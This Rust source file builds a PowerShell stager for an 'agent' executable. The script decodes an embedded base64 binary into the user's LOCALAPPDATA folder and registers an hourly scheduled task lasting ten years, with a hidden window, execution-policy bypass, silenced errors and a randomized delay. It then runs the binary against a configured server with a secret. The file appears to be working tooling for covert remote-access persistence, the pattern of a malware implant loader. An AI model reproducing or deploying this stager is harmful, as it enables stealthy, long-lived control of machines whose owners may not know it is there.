//! The agent PowerShell script. One idempotent script serves both delivery
//! contexts: the wrapper form (served at the script endpoint) persists the
//! payload to the install directory and runs it, and the payload form (run
//! hourly by the scheduled task) re-checks the exe and task before beaming.
//!
//! Values are substituted into single-quoted PowerShell literals, with
//! apostrophes doubled the PowerShell way.

use base64::Engine;

pub struct AgentSettings {
    pub server_url: String,
    pub secret: String,
    pub install_subdir: String,
    pub task_name: String,
    pub exe_name: String,
    pub script_name: String,
}

const WRAPPER_TEMPLATE: &str = r#"
$ErrorActionPreference = 'SilentlyContinue'
$payload = @'
__PAYLOAD__
'@
$scriptPath = Join-Path (Join-Path $env:LOCALAPPDATA __INSTALL_SUBDIR__) __SCRIPT_NAME__
$directory = Split-Path -Parent $scriptPath
if (-not (Test-Path $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
[IO.File]::WriteAllText($scriptPath, $payload)
Invoke-Expression $payload
"#;

const PAYLOAD_TEMPLATE: &str = r#"
$ErrorActionPreference = 'SilentlyContinue'
$serverUrl = __SERVER_URL__
$secret = __SECRET__
$installDir = Join-Path $env:LOCALAPPDATA __INSTALL_SUBDIR__
$taskName = __TASK_NAME__
$exePath = Join-Path $installDir __EXE_NAME__
$scriptPath = Join-Path $installDir __SCRIPT_NAME__
$agentB64 = __AGENT_B64__

if (-not (Test-Path $installDir)) { New-Item -ItemType Directory -Path $installDir -Force | Out-Null }
if (-not (Test-Path $exePath)) {
    [IO.File]::WriteAllBytes($exePath, [Convert]::FromBase64String($agentB64))
}

$task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $task) {
    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $trigger = $null
    try {
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes((Get-Random -Minimum 1 -Maximum 11)) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3650) -RandomDelay (New-TimeSpan -Minutes 10)
    } catch {
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3650)
    }
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit (New-TimeSpan -Minutes 30)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
}

& $exePath --server $serverUrl --secret $secret | Out-Null
"#;

fn ps_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "''"))
}

pub fn build_agent_script(settings: &AgentSettings, agent_exe: &[u8]) -> String {
    let encoded = base64::engine::general_purpose::STANDARD.encode(agent_exe);
    let payload = PAYLOAD_TEMPLATE
        .replace("__SERVER_URL__", &ps_quote(&settings.server_url))
        .replace("__SECRET__", &ps_quote(&settings.secret))
        .replace("__INSTALL_SUBDIR__", &ps_quote(&settings.install_subdir))
        .replace("__TASK_NAME__", &ps_quote(&settings.task_name))
        .replace("__EXE_NAME__", &ps_quote(&settings.exe_name))
        .replace("__SCRIPT_NAME__", &ps_quote(&settings.script_name))
        .replace("__AGENT_B64__", &ps_quote(&encoded));
    // A line equal to the here-string terminator inside the payload would end
    // the wrapper's here-string early and corrupt the script.
    debug_assert!(payload.lines().all(|line| line.trim_end() != "'@"));
    WRAPPER_TEMPLATE
        .replace("__PAYLOAD__", &payload)
        .replace("__INSTALL_SUBDIR__", &ps_quote(&settings.install_subdir))
        .replace("__SCRIPT_NAME__", &ps_quote(&settings.script_name))
}
